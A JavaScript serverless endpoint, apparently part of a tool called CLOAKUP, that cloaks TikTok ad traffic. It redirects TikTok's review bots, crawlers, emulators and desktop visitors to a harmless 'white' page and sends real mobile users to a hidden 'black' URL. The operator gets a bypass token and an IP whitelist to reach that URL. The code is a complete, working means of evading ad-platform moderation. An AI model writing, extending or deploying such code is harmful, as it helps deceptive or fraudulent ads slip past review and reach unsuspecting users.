// ============================================================
// CLOAKUP - Endpoint Principal de Cloaking
// Rota: /api/cloak/*
// ============================================================
// LÓGICA SIMPLES - Apenas 2 DESTINOS POSSÍVEIS:
//
//   1. Bots, crawlers, robots, headless -> WHITE URL
//   2. Desktop/PC (Windows / Mac / Linux) -> WHITE URL
//   3. Mobile (Android / iOS / qualquer celular) -> BLACK URL
//
// SOMENTE 2 DESTINOS: whiteUrl e blackUrl.
// NADA de tela de bloqueio, NADA de redirecionar para TikTok,
// NADA de intermediação.
// ============================================================

import { isBot, isEmulator, getPlatform } from '../../../utils/ua.js';
const { detectASN } = await import('../../../utils/ip.js');

const fs = await import('fs');
const { STORAGE_DIR, storagePath } = await import('../storage.js');

const CONFIG_PATH = storagePath('config.json');
const LOGS_PATH = storagePath('access.log');

const DEFAULT_CONFIG = {
  brandName: 'CLOAKUP',
  brandSlogan: 'Proteção de tráfego de alto nível para TikTok Ads',

  blackUrl: '',
  whiteUrl: 'https://www.tiktok.com',
  decoyUrl: 'https://www.tiktok.com',

  whitelistEnabled: true,
  whitelistIPs: [],
  blacklistEnabled: false,
  blacklistIPs: [],

  strictTiktokBots: [
    'TikTok Advertising', 'TikTok Ads Manager', 'TikTok Pixel', 'tiktok-tracker',
    'omnilabs', 'bytedance', 'ByteDance', 'ByteDance-InstaFeed-Jackson', 'TikTok Download Video',
  ],
  blockSearchBots: true,
  customBlockedUAs: [],
  blockEmulators: true,

  // Filtros opcionais - desligados por padrão para a regra ser SIMPLES (só dispositivo + bot)
  proxyEnabled: false,
  adsSpyEnabled: false,
  geoEnabled: false,
  refererEnabled: false,
  paramsEnabled: false,
  langEnabled: false,
  uaEnabled: false,
  ispEnabled: false,

  bypassParam: 'bypass',
  bypassSessionLifetime: 2592000,

  campaigns: [],
};

// Funções expostas para debug / testes
export function readConfig() {
  // 1) Variaveis de ambiente (Vercel dashboard) - SEMPRE sobrepoe (se definidas)
  const envConfig = {};
  if (process.env.CLOAKER_BLACK_URL) envConfig.blackUrl = process.env.CLOAKER_BLACK_URL;
  if (process.env.CLOAKER_WHITE_URL) envConfig.whiteUrl = process.env.CLOAKER_WHITE_URL;

  // 2) Arquivo config do .cloaker (config base commitada) - lida com erro, nao falha
  const fileConfig = {};
  try {
    if (fs.existsSync(CONFIG_PATH)) {
      const loaded = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
      Object.assign(fileConfig, loaded);
    }
  } catch { /* json invalido ou ausencia -> ignora */ }

  // Merge: default < file < env (env só conta se definida, pra nao sobrescrever com undefined)
  return { ...DEFAULT_CONFIG, ...fileConfig, ...envConfig };
}
// ============================================================
// LOGGING (apenas auditoria, nunca bloqueia)
// ============================================================
export async function logDecision(request, result) {
  const ua = request.headers.get('user-agent') || '';
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
             request.headers.get('x-real-ip') ||
             request.socket?.remoteAddress || 'unknown';

  const logEntry = {
    event: 'access',
    decision: result.decision,
    reason: result.reason,
    ip,
    platform: result.platform || 'unknown',
    campaign_id: new URL(request.url).searchParams.get('campaign_id'),
    filters: result.filters || [],
    ua: ua.slice(0, 200),
    path: new URL(request.url).pathname,
  };

  try {
    if (!fs.existsSync(STORAGE_DIR)) {
      fs.mkdirSync(STORAGE_DIR, { recursive: true });
    }
    const timestamp = new Date().toISOString();
    const line = JSON.stringify({ ...logEntry, timestamp, id: Date.now().toString(36) }) + '\n';
    fs.appendFileSync(LOGS_PATH, line, 'utf8');
  } catch { /* logs assíncronos não podem falhar */ }
}

// ============================================================
// MOTOR DE DECISÃO SIMPLES - Apenas 2 destinos: WHITE ou BLACK
// ============================================================
export function decide(request, config) {
  const ua = request.headers.get('user-agent') || '';
  const uaLower = ua.toLowerCase();
  const result = {
    decision: null,     // 'WHITE' | 'BLACK'
    reason: null,
    platform: 'unknown',
    filters: [],
  };

  // --- 1. Token de bypass (permite ir direto para o BLACK - util para voce) ---
  const bypass = new URL(request.url).searchParams.get(config.bypassParam) ||
                 new URL(request.url).searchParams.get('token');
  if (bypass) {
    result.decision = 'BLACK';
    result.reason = 'BYPASS_TOKEN';
    result.filters.push('bypass');
    return result;
  }

  // --- 2. Whitelist de IPs (ACESSO ao BLACK - ex: voce/admin) ---
  const ip = (request.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
              request.headers.get('x-real-ip') || 'unknown');
  if (config.whitelistEnabled && config.whitelistIPs.includes(ip)) {
    result.decision = 'BLACK';
    result.reason = 'WHITELIST_IP';
    result.filters.push('whitelist');
    return result;
  }

  // --- 3. Detecção de bot / crawler / robot / script / headless -> WHITE ---
  let detectedBot = null;

  // Bots das redes sociais / anuncios
  for (const sig of config.strictTiktokBots || []) {
    if (uaLower.includes(sig.toLowerCase())) {
      detectedBot = 'TIKTOK_' + sig.replace(/\s/g, '_');
      break;
    }
  }

  if (!detectedBot) {
    const botCheck = isBot(ua, { ignoreBots: [] });
    if (botCheck.isBot) {
      detectedBot = 'BOT_' + (botCheck.type || 'UNKNOWN');
    }
  }

  if (!detectedBot) {
    for (const custom of config.customBlockedUAs || []) {
      if (uaLower.includes(custom.toLowerCase())) {
        detectedBot = 'BOT_CUSTOM';
        break;
      }
    }
  }

  if (detectedBot) {
    result.decision = 'WHITE';
    result.reason = detectedBot;
    result.filters.push('bot');
    return result;
  }

  // --- 4. Emuladores -> WHITE ---
  if (config.blockEmulators && isEmulator(ua)) {
    result.decision = 'WHITE';
    result.reason = 'EMULATOR';
    result.filters.push('emulator');
    return result;
  }

  // --- 5. Proxy / VPN / Datacenter (OPCIONAL) -> WHITE se ativo ---
  //    Desligado por padrao para manter a regra SIMPLES
  if (config.proxyEnabled) {
    try {
      const type = detectASN(ip);
      if (type === 'datacenter' || type === 'hosting' || type === 'proxy') {
        result.decision = 'WHITE';
        result.reason = type.toUpperCase();
        result.filters.push('proxy');
        return result;
      }
    } catch { /* sem IPDB, ignora */ }
  }

  // --- 6. Geolocalizacao (OPCIONAL) -> WHITE se pais bloqueado/permitido ---
  //    Desligado por padrao para manter a regra SIMPLES
  if (config.geoEnabled) {
    let country = request.headers.get('cf-ipcountry') ||
                  request.headers.get('x-geocluster') ||
                  request.headers.get('x-client-country') ||
                  request.headers.get('x-ipcountry') ||
                  request.headers.get('cf-ipcc') ||
                  request.headers.get('Fastly-Client-Ip') ||
                  request.headers.get('True-Client-Ip');
    if (country) {
      country = String(country).toUpperCase().slice(0, 2);
      if (/^[A-Z]{2}$/.test(country)) {
        const { allowedCountries, blockedCountries } = config.geoSettings;
        if (blockedCountries.includes(country)) {
          result.decision = 'WHITE';
          result.reason = 'GEO_BLOCKED_' + country;
          result.filters.push('geo');
          return result;
        }
        if (allowedCountries.length && !allowedCountries.includes(country)) {
          result.decision = 'WHITE';
          result.reason = 'GEO_ALLOWED_ONLY_' + country;
          result.filters.push('geo');
          return result;
        }
      }
    }
  }

  // ============================================================
  // DECISAO FINAL POR DISPOSITIVO (REGRAS PRINCIPAIS)
  // ============================================================
  const platform = getPlatform(ua);

  // Desktop, Mac, Linux, tablet desktop, console -> WHITE
  if (platform === 'desktop' || platform === 'mac' || platform === 'linux' ||
      platform === 'windows' || platform === 'console') {
    result.decision = 'WHITE';
    result.reason = 'DESKTOP';
    result.platform = platform;
    result.filters.push('device');
    return result;
  }

  // Mobile real (Android, iOS) -> BLACK
  if (platform === 'mobile') {
    result.decision = 'BLACK';
    result.reason = 'MOBILE_REAL';
    result.platform = platform;
    result.filters.push('device');
    return result;
  }

  // Qualquer UA desconhecido -> WHITE (padrao seguro)
  result.decision = 'WHITE';
  result.reason = 'UNKNOWN';
  result.platform = platform || 'unknown';
  result.filters.push('default');
  return result;
}

// ============================================================
// REDIRECIONAMENTO - resolve WHITE ou BLACK
// ============================================================
export function resolveTarget(request, decision, config) {
  const campaignId = new URL(request.url).searchParams.get('campaign_id');

  if (decision === 'BLACK') {
    if (campaignId) {
      const camp = config.campaigns.find(c => String(c.campaignId) === String(campaignId));
      if (camp && camp.blackUrl) return camp.blackUrl;
    }
    return config.blackUrl || 'https://www.tiktok.com';
  }

  // WHITE (padrao)
  if (campaignId) {
    const camp = config.campaigns.find(c => String(c.campaignId) === String(campaignId));
    if (camp && camp.whiteUrl) return camp.whiteUrl;
  }
  return config.whiteUrl || config.decoyUrl || 'https://www.tiktok.com';
}

// ============================================================
// HANDLER PRINCIPAL
// ============================================================
export default async function handler(request) {
  if (request.method !== 'GET') {
    return new Response('Method not allowed', { status: 405 });
  }

  const config = readConfig();
  const result = decide(request, config);

  // Log da decisão (assincrono, nao bloqueia)
  logDecision(request, result).catch(() => {});

  // Redireciona para o destino correto
  const target = resolveTarget(request, result.decision, config);

  return Response.redirect(target, 302);
}

export { handler as GET, handler as POST };
